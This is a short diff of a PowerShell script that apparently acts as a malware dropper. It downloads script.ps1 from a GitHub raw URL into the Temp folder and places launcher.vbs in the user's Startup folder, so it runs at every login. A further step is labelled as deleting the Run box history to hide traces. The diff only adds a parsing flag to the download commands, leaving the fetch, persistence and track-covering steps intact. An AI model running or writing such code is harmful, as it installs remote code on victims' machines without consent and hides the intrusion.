@@ -1,10 +1,10 @@
 #1
 Set-Location $env:Temp
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/script.ps1 -O script.ps1
+Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/script.ps1 -O script.ps1 -UseBasicParsing
 
 #2
 Set-Location $env:AppData\Microsoft\Windows\"Start Menu"\Programs\Startup
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs
+Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/launcher.vbs -O launcher.vbs -UseBasicParsing
 
 #3
 # delete run box history
